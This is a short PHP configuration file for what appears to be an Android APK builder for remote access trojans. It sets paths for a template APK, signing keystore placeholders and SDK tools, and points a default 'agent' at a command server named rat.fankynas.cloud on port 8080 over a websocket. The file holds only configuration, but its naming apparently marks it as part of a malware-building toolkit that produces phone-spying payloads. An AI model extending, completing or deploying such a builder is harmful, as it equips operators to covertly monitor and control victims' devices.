<?php
// Konfigurasi APK Builder
define('BASE_PATH', dirname(__DIR__));
define('TEMPLATE_APK', BASE_PATH . '/builder/templates/base.apk');
define('WORKSPACE_DIR', BASE_PATH . '/builder/workspace/');
define('OUTPUT_DIR', BASE_PATH . '/builder/output/');
define('LOG_FILE', BASE_PATH . '/builder/logs/build.log');

// Android SDK Path (sesuaikan dengan path di server Anda)
define('AAPT_PATH', '/usr/local/android-sdk/build-tools/35.0.0/aapt');
define('APKSIGNER_PATH', '/usr/local/android-sdk/build-tools/35.0.0/apksigner');
define('ZIPALIGN_PATH', '/usr/local/android-sdk/build-tools/35.0.0/zipalign');

// Default server untuk agent
define('DEFAULT_SERVER', 'rat.fankynas.cloud');
define('DEFAULT_PORT', 8080);
define('DEFAULT_WEBSOCKET_PATH', '/ws');

// Keystore untuk signing APK (buat sendiri)
define('KEYSTORE_PATH', BASE_PATH . '/builder/keystore/my-release-key.keystore');
define('KEYSTORE_PASS', 'your_keystore_password');
define('KEY_ALIAS', 'fankynas');
define('KEY_PASS', 'your_key_password');

// Pastikan folder workspace dan output bisa ditulis
if (!is_dir(WORKSPACE_DIR)) mkdir(WORKSPACE_DIR, 0777, true);
if (!is_dir(OUTPUT_DIR)) mkdir(OUTPUT_DIR, 0777, true);
if (!is_dir(dirname(LOG_FILE))) mkdir(dirname(LOG_FILE), 0777, true);
?>
